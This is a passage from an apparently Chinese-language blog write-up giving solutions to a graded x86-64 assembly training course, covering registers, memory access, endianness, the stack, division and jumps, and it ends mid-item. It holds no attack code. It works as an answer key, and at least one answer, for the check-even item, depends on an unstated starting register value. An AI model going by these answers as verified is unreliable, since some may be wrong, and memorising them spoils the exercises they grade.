set-upper-byte</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">MSB                                    LSB</span><br><span class="hljs-section">+----------------------------------------+</span><br><span class="hljs-section">|                   rax                  |</span><br><span class="hljs-section">+--------------------+-------------------+</span><br><span class="hljs-code">                     |        eax        |</span><br><span class="hljs-code">                     +---------+---------+</span><br><span class="hljs-code">                               |   ax    |</span><br><span class="hljs-code">                               +----+----+</span><br><span class="hljs-code">                               | ah | al |</span><br><span class="hljs-code">                               +----+----+</span><br></code></pre></td></tr></table></figure><p>Using only one move instruction, please set the upper 8 bits of the <code>ax</code> register to <code>0x42</code>.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-number">ah</span>, <span class="hljs-number">0x42</span><br></code></pre></td></tr></table></figure><h4 id="8-efficient-modulo"><a href="#8-efficient-modulo" class="headerlink" title="8. efficient-modulo"></a>8. efficient-modulo</h4><p>Using only the following instruction(s):</p><ul><li><code>mov</code></li></ul><p>Please compute the following:</p><ul><li><code>rax = rdi % 256</code></li><li><code>rbx = rsi % 65536</code></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">cl</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>, <span class="hljs-built_in">dx</span><br></code></pre></td></tr></table></figure><h4 id="9-byte-extraction"><a href="#9-byte-extraction" class="headerlink" title="9. byte-extraction"></a>9. byte-extraction</h4><p><code>shl</code>指令：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-comment">;rax = 10001010</span><br><span class="hljs-keyword">shl</span> al<span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><br><span class="hljs-comment">;al = 00010100</span><br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">shr</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">32</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">bl</span><br></code></pre></td></tr></table></figure><h4 id="10-bitwise-and"><a href="#10-bitwise-and" class="headerlink" title="10. bitwise-and"></a>10. bitwise-and</h4><p>如果不使用以下说明：<code>mov</code>、<code>xchg</code>，请执行以下操作：<br>将 <code>rax</code> 设置为 <code>（rdi AND rsi）</code> 的值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">and</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">and</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br></code></pre></td></tr></table></figure><h4 id="11-check-even"><a href="#11-check-even" class="headerlink" title="11. check-even"></a>11. check-even</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">and</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">and</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br></code></pre></td></tr></table></figure><h4 id="12-memory-read"><a href="#12-memory-read" class="headerlink" title="12. memory-read"></a>12. memory-read</h4><p>请执行以下操作：将存储在 <code>0x404000</code> 的值放入 <code>rax</code> 中。确保 <code>rax</code> 中的值是存储在 <code>0x404000</code> 的原始值。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-number">0x404000</span>]<br><br></code></pre></td></tr></table></figure><h4 id="13-memory-write"><a href="#13-memory-write" class="headerlink" title="13. memory-write"></a>13. memory-write</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-number">0x404000</span>], <span class="hljs-built_in">rax</span><br><br></code></pre></td></tr></table></figure><h4 id="14-memory-increment"><a href="#14-memory-increment" class="headerlink" title="14. memory-increment"></a>14. memory-increment</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-number">0x404000</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span> , <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rbx</span> , <span class="hljs-number">0x1337</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-number">0x404000</span>], <span class="hljs-built_in">rbx</span><br></code></pre></td></tr></table></figure><h4 id="15-byte-access"><a href="#15-byte-access" class="headerlink" title="15. byte-access"></a>15. byte-access</h4><p>Here is the breakdown of the names of memory sizes:<br>以下是内存大小名称的细分：</p><ul><li>Quad Word &#x3D; 8 Bytes &#x3D; 64 bits<br>四字 &#x3D; 8 字节 &#x3D; 64 位</li><li>Double Word &#x3D; 4 bytes &#x3D; 32 bits<br>双字 &#x3D; 4 字节 &#x3D; 32 位</li><li>Word &#x3D; 2 bytes &#x3D; 16 bits<br>字 &#x3D; 2 字节 &#x3D; 16 位</li><li>Byte &#x3D; 1 byte &#x3D; 8 bits<br>字节 &#x3D; 1 字节 &#x3D; 8 位</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, [<span class="hljs-number">0x404000</span>]<br></code></pre></td></tr></table></figure><p>在 x86_64 中，您可以在取消引用地址时访问这些大小，就像使用更大或更小的 register 访问一样：</p><ul><li><code>mov al, [address]</code> &lt;&#x3D;&gt; moves the least significant byte from address to <code>rax</code><br><code>mov al， [address]</code> &lt;&#x3D;&gt; 将最低有效字节从 address 移动到 <code>rax</code></li><li><code>mov ax, [address]</code> &lt;&#x3D;&gt; moves the least significant word from address to <code>rax</code><br><code>mov ax， [address]</code> &lt;&#x3D;&gt; 将最低有效字从 address 移动到 <code>rax</code></li><li><code>mov eax, [address]</code> &lt;&#x3D;&gt; moves the least significant double word from address to <code>rax</code><br><code>mov eax， [address]</code> &lt;&#x3D;&gt; 将最低有效双字从 address 移动到 <code>rax</code></li><li><code>mov rax, [address]</code> &lt;&#x3D;&gt; moves the full quad word from address to <code>rax</code><br><code>mov rax， [address]</code> &lt;&#x3D;&gt; 将完整的四元字从 address 移动到 <code>rax</code></li></ul><h4 id="16-memory-size-access"><a href="#16-memory-size-access" class="headerlink" title="16. memory-size-access"></a>16. memory-size-access</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, [<span class="hljs-number">0x404000</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>, [<span class="hljs-number">0x404000</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>, [<span class="hljs-number">0x404000</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-number">0x404000</span>]<br></code></pre></td></tr></table></figure><h4 id="17-little-endian-write"><a href="#17-little-endian-write" class="headerlink" title="17. little-endian-write"></a>17. little-endian-write</h4><p>值得注意的是，值的存储顺序与我们表示它们的顺序相反。example:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-comment">;[0x1330] = 0x00000000deadc0de</span><br><span class="hljs-comment">; 检查它在内存中的实际存储情况：</span><br><span class="hljs-comment">;[0x1330] = 0xde</span><br><span class="hljs-comment">;[0x1331] = 0xc0</span><br><span class="hljs-comment">;[0x1332] = 0xad</span><br><span class="hljs-comment">;[0x1333] = 0xde</span><br><span class="hljs-comment">;[0x1334] = 0x00</span><br><span class="hljs-comment">;[0x1335] = 0x00</span><br><span class="hljs-comment">;[0x1336] = 0x00</span><br><span class="hljs-comment">;[0x1337] = 0x00</span><br></code></pre></td></tr></table></figure><p>这就是小端存储（Little Endian）。</p><p>exp</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0xdeadbeef00001337</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0xc0ffee0000</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rsi</span>], <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure><h4 id="18-memory-sum"><a href="#18-memory-sum" class="headerlink" title="18. memory-sum"></a>18. memory-sum</h4><p>内存是连续存储的，因此可以使用偏移量来获取指定字节。例如：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs prolog">;[<span class="hljs-number">0x1337</span>] = <span class="hljs-number">0x00000000deadbeef</span><br>;[<span class="hljs-number">0x1337</span>] = <span class="hljs-number">0xef</span><br>;[<span class="hljs-number">0x1337</span> + <span class="hljs-number">1</span>] = <span class="hljs-number">0xbe</span><br>;[<span class="hljs-number">0x1337</span> + <span class="hljs-number">2</span>] = <span class="hljs-number">0xad</span><br>...<br>;[<span class="hljs-number">0x1337</span> + <span class="hljs-number">7</span>] = <span class="hljs-number">0x00</span><br>; 假设我需要访问某个地址的第<span class="hljs-number">5</span>个字节。那么可以：<br>mov al, [address+<span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><p>题目要求：</p><ul><li>Load two consecutive quad words from the address stored in <code>rdi</code>.<br>从存储在 <code>rdi</code> 中的地址加载两个连续的四字。</li><li>Calculate the sum of the previous steps’ quad words.<br>计算前面步骤的四边形词的总和。</li><li>Store the sum at the address in <code>rsi</code>.<br>将总和存储在 <code>rsi</code> 中的地址。</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rdi</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> [<span class="hljs-built_in">rsi</span>], <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure><h4 id="19-stack-substraction"><a href="#19-stack-substraction" class="headerlink" title="19. stack-substraction"></a>19. stack-substraction</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure><h4 id="20-swap-stack-values"><a href="#20-swap-stack-values" class="headerlink" title="20. swap-stack-values"></a>20. swap-stack-values</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br></code></pre></td></tr></table></figure><h4 id="21-average-stack-values"><a href="#21-average-stack-values" class="headerlink" title="21. average-stack-values"></a>21. average-stack-values</h4><p>除法还是很坑的，记得一定是<code>rdx:rax / reg</code>，商在rax中，余数在rdx中。因此，在调用div的时候一定要清空rdx寄存器（如果被除数没有占用到rdx的话）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rsp</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x8</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x10</span>]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x18</span>]<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rcx</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">div</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure><h4 id="22-absolute-jump"><a href="#22-absolute-jump" class="headerlink" title="22. absolute-jump"></a>22. absolute-jump</h4><p>绝对跳转，指的是跳转到指定地址</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x403000</span><br>    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure><h4 id="23-relative-jump"><a href="#23-relative-jump" class="headerlink" title="23. relative-jump"></a>23. relative-jump</h4><p>对于所有跳转，有三种类型：</p><ul><li>Relative jumps: jump + or - the next instruction.<br>相对跳转：jump + 或 - 下一条指令。</li><li>Absolute jumps: jump to a specific address.<br>Absolute jumps：跳转到指定地址。</li><li>Indirect jumps: jump to the memory address specified in a register.<br>Indirect jumps：跳转到 register 中指定的 memory 地址。</li></ul><p><code>jmp (reg1 | addr | +/-offset)</code></p><p>要求：</p><ul><li>Make the first instruction in your code a <code>jmp</code>.<br>将代码中的第一条指令设为 <code>jmp</code>。</li><li>Make that <code>jmp</code> a relative jump to 0x51 bytes from the current position.<br>使该 <code>jmp</code> 相对跳转到 0x51 字节的当前位置。</li><li>At the code location where the relative jump will redirect control flow, set <code>rax</code> to 0x1.<br>在相对跳转将重定向控制流的代码位置，将 <code>rax</code> 设置为 0x1。</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">jmp</span> set_rax<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0x51</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br><span class="hljs-symbol">set_rax:</span>   <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x1</span><br></code></pre></td></tr></table></figure><h4 id="24-jump-trampoline"><a href="#24-jump-trampoline" class="headerlink" title="24. jump-trampoline"></a>24. jump-trampoline</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">jmp</span> set_rax<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0x51</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br><span class="hljs-symbol">set_rax:</span>  <br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x403000</span><br>    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rbx</span><br></code></pre></td></tr></table></figure><h4 id="25-conditional-jump"><a href="#25-conditional-jump" class="headerlink" title="25. conditional-jump"></a>25. conditional-jump</h4><p>挖草，巨坑的一点！</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x7f454c46</span><br>    <span class="hljs-keyword">je</span> flag_1<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x00005A4D</span><br>    <span class="hljs-keyword">je</span> flag_2<br>    <span class="hljs-keyword">jmp</span> flag_3<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">flag_1:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">12</span>]<br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol">flag_2:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">12</span>]<br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol">flag_3:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">imul</span> <span class="hljs-built_in">eax</span>,[<span class="hljs-built_in">rdi</span>+<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">imul</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">12</span>]<br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol">done:</span><br></code></pre></td></tr></table></figure><p>注意的是<code>mov eax, [rdi]</code>，如果用<code>mov rax, [rdi]</code>会出问题，因为会读取<code>rdi</code>地址上的pword，那么永远走的都是else下的语句。服了。</p><h4 id="26-indirect-jump"><a href="#26-indirect-jump" class="headerlink" title="26. indirect-jump"></a>26. indirect-jump</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">jg</span> <span class="hljs-meta">default</span><br>    <span class="hljs-keyword">imul</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">8</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> [<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">default:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">jmp</span> [<span class="hljs-built_in">rax</span>]<br></code></pre></td></tr></table></figure><p>这里其实也有坑，需要好好把控<code>[]</code>会解析地址。例如下面的exp：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">jg</span> <span class="hljs-meta">default</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rsi</span> + <span class="hljs-built_in">rdi</span> * <span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">default:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rsi</span> + <span class="hljs-number">0x20</span>]<br>    <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rax</span><br></code></pre></td></tr></table></figure><h4 id="27-average-loop"><a href="#27-average-loop" class="headerlink" title="27. average-loop"></a>27. average-loop</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span 